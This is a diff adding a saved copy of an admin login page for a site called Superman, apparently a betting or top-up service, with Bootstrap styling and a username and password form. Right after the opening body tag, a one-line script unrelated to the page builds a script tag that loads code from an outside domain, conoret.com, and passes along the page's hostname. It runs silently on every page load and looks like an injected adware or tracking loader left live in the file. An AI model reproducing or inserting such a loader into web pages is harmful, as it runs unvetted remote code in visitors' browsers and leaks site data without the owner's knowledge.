@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://superman788.online/login -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ 
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>SUPERMAN</title>
+ <link rel="icon" href="./login-bg-img_files/logo.png">
+ <link rel="stylesheet" href="./login-bg-img_files/style.css">
+ <!-- Bootstrap 5 CSS -->
+ <link href="./login-bg-img_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+
+ <link rel="preconnect" href="https://fonts.googleapis.com/">
+ <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+ <link href="./login-bg-img_files/css2" rel="stylesheet">
+
+ <!-- Material Css -->
+ <link rel="stylesheet" href="./login-bg-img_files/material-icons.min.css">
+ <link rel="stylesheet" type="text/css" href="./login-bg-img_files/toastify.min.css">
+ <!-- font awesome  -->
+ <link rel="stylesheet" href="./login-bg-img_files/all.min.css">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap');
+    * {
+        /* font-family: 'Poppins', sans-serif; */
+        font-family: 'Ubuntu', sans-serif;
+    }
+    #main {
+        background-image: url("https://superman788.online/assets/img/background.jpg"); /* Dynamically set background image */
+        /* fallback background color, uncomment if needed */
+        /* background: #000; */
+        min-height: 100vh; /* Ensure the container takes up the full viewport height */
+        background-repeat: no-repeat; /* Prevent the image from repeating */
+        background-size: cover; /* Ensure the image covers the entire container */
+        background-position: center; /* Center the image within the container */
+    }
+    .login-card{
+        box-shadow: 1px 2px 3px rgb(255, 0, 0);
+        background-color: rgba(119, 0, 0, 0.5);
+    }
+ </style>
+</head>
+
+<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+  <div class=" container-fluid" id="main">
+    <div class="pt-5">
+      <div class="row">
+        <div class="col-md-4 offset-md-4">
+          <div class="p-3 shadow border border-1 border-danger rounded-4 login-card">
+            <div class="text-center mt-3">
+              <img src="./login-bg-img_files/logo.png" alt="" style="width: 120px; height: auto">
+            </div>
+            <h4 class="text-center mt-3 text-white">Superman</h4>
+            <h5 class="text-center mt-3 text-white">Admin Login</h5>
+            
+            <form action="https://superman788.online/login" method="post" class="px-3 pb-4 pt-3">
+              <input type="hidden" name="_token" value="STz2YXv463salNdFYIMTVZ7Nn9dhcEP5I1JSB9Tt" autocomplete="off">              <div class="mb-3">
+                <label for="login" class="form-label text-white">Username</label>
+                <input type="text" name="user_name" id="login" class="form-control" placeholder="Enter username ">
+                              </div>
+      
+              <div class="mb-3">
+                <label for="password" class="form-label text-white">Password</label>
+                <div class="input-group border border-0 rounded-4">
+                  <span class="input-group-text bg-white border border-0"><i class="fas fa-key text-purple"></i></span>
+                  <input type="password" name="password" id="password" class="form-control border border-0" placeholder="Enter password">
+                  <span class="input-group-text bg-white border border-0"><i class="fas fa-eye text-purple" id="eye" onclick="PwdView()" style="cursor: pointer;"></i></span>
+                </div>
+                              </div>
+      
+              <div class="mb-3 mt-2">
+                <button type="submit" class="btn btn-danger w-100">LOGIN</button>
+              </div>
+      
+              
+      
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+  </div>
+
+
+
+
+<script src="./login-bg-img_files/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+<script src="./login-bg-img_files/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="./login-bg-img_files/jquery(1).min.js"></script>
+<script type="text/javascript" src="./login-bg-img_files/toastify-js"></script>
+        
+<script>
+//  $("#topup").click(function() {
+//   $("#withdraw").removeClass("active");
+//   $("#topup").addClass("active");
+
+//   $(".topup").removeClass("d-none");
+//   $(".withdraw").addClass("d-none");
+//  });
+
+//  $("#withdraw").click(function() {
+//   $("#withdraw").addClass("active");
+//   $("#topup").removeClass("active");
+
+//   $(".withdraw").removeClass("d-none");
+//   $(".topup").addClass("d-none");
+//  });
+
+ const banks = document.querySelectorAll(".bank");
+
+ banks.forEach((bank) => {
+  bank.addEventListener("click", function() {
+   banks.forEach((other) => {
+    other.classList.remove("active");
+   });
+   this.classList.add("active");
+  });
+ });
+</script>
+
+<script>
+  function PwdView() {
+    var x = document.getElementById("password");
+    var y = document.getElementById("eye");
+
+    if (x.type === "password") {
+      x.type = "text";
+      y.classList.remove('fa-eye');
+      y.classList.add('fa-eye-slash');
+    } else {
+      x.type = "password";
+      y.classList.remove('fa-eye-slash');
+      y.classList.add('fa-eye');
+    }
+  }
+</script></body></html>
